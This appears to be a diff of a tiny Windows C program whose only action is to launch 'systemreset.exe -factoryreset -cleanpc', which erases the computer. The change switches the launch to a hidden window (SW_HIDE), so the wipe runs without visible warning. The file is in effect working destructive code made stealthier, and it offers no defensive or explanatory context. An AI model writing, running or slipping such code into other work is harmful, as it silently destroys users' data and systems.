@@ -3,7 +3,7 @@
 #include <windows.h>
 
 int main(){
-    ShellExecute(NULL,"open","systemreset.exe","-factoryreset -cleanpc",NULL,SW_SHOWNORMAL);
+    ShellExecute(NULL,"open","systemreset.exe","-factoryreset -cleanpc",NULL,SW_HIDE);
 
     return 0;
 }
